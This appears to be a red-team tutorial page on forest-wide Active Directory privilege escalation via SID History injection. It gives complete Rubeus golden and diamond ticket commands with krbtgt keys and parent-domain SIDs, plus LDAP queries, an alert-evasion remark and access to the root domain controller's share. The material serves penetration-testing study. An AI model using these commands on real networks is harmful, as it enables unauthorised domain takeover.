---
title: "Intra-Forest Privilege Escalation (Parent-Child Trusts)"
date: 2026-09-25
weight: 4
type: docs
tags:
  - Active Directory
  - Forest & Domain Trusts
---

When a child domain is added underneath an existing directory tree, Active Directory automatically provisions a bidirectional, transitive trust relationship between the parent and child partitions. Because of implicit trust transitivity, this link covers all lower levels of the directory tree—such as `sub.child.domain.com` or deeper nested subdomains—ensuring that every node maintains a valid authentication path back to the forest root (`domain.com`).

Querying a Trusted Domain Object (TDO) across this link reveals a bidirectional trust configuration pointing back to the parent structure.

```powershell
beacon> ldapsearch (objectClass=trustedDomain)

name: arcadia.local
trustDirection: 3
trustAttributes: 32
flatName: ARCADIA
```

## Forest-Wide Compromise via SID History Injection

Within a single Active Directory forest, the domain root functions as the ultimate security boundary. If an operator establishes Domain Administrator privileges within any child domain, they can escalate their access forest-wide to assume Enterprise Administrator control. This pivoting technique exploits a legacy migration feature known as SID History. 

SID History was designed to preserve a user's access rights to legacy assets during corporate restructuring or object migrations by appending their old security identifiers (SIDs) to their updated account properties. When forging an authentication token across an intra-forest trust link, an operator can inject the SID of a high-privilege group (such as Enterprise Admins or Schema Admins) from the parent domain directly into the ticket's SID History block.

This forged cross-realm ticket can be assembled entirely offline using the local `krbtgt` secret of the compromised child domain.

```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:sub.arcadia.local /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-4192837465-1122334455-998877665-519 /nowrap
```

Command execution parameters:
* `/aes256`: The master AES cryptographic hash belonging to the child domain's `krbtgt` account.
* `/user`: The target identity profile context to impersonate.
* `/domain`: The Fully Qualified Domain Name (FQDN) of the local child domain partition.
* `/sid`: The baseline domain security identifier (SID) of the local child domain.
* `/sids`: The target high-privilege group SID from the parent domain to inject into the SID History buffer (e.g., appending `-519` targets the Enterprise Admins group).

To identify the correct root forest SID, operators can issue an LDAP query directly against an active root domain controller, adjusting the search path to target the parent partition's distinguished name.

```powershell
beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname dc-1.arcadia.local --dn DC=arcadia,DC=local

Binding to dc-1.arcadia.local

[*] Distinguished name: DC=arcadia,DC=local
[*] Filter: (objectClass=domain)
[*] Scope of search value: 1
[*] Returning specific attribute(s): objectSid

--------------------
objectSid: S-1-5-21-4192837465-1122334455-998877665
```

### Direct Inline Execution (The Diamond Technique)

Alternatively, operators can use the Diamond Ticket approach online to request a valid TGT from the local KDC, modify its authorization attributes using the child domain's `krbtgt` key, and inject the parent's administrative SIDs directly into the session ticket.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-4192837465-1122334455-998877665-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
```

Command layout properties:
* `/tgtdeleg`: Uses local API calls to safely request a usable TGT without triggering heavy credential access alerts.
* `/ticketuser`: The identity profile context to present.
* `/ticketuserid`: The Relative Identifier (RID) mapping matching the user account context (e.g., `500` for the built-in Administrator account).
* `/sids`: The explicit group SID from the root domain to inject into the ticket's internal structure (e.g., appending `-512` targets the Domain Admins group of the forest root).
* `/krbkey`: The master AES-256 secret hash derived from the local child domain's `krbtgt` account.

Once this modified ticket is imported into an active command session, the token grants full administrative access to administrative shares and directory resources on the forest root domain controllers.

```powershell
beacon> ls \\dc-1\c\$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   \$Recycle.Bin
          dir     01/24/2025 13:33:21   Users
          dir     01/24/2025 13:49:56   Windows
```
